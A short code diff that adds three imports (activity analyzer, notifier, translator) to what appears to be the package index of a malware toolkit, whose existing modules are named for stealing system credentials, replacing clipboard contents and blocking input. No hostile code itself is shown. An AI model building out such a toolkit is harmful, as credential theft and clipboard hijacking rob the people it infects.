@@ -14,3 +14,6 @@ from .input_block import InputBlock
 from .system_credentials import SystemCredentialsStealer
 from .clipboard_replacer import ClipboardReplacer
 from .network_scanner import NetworkScanner
+from .activity_analyzer import ActivityAnalyzer
+from .notifier import Notifier
+from .translator import Translator
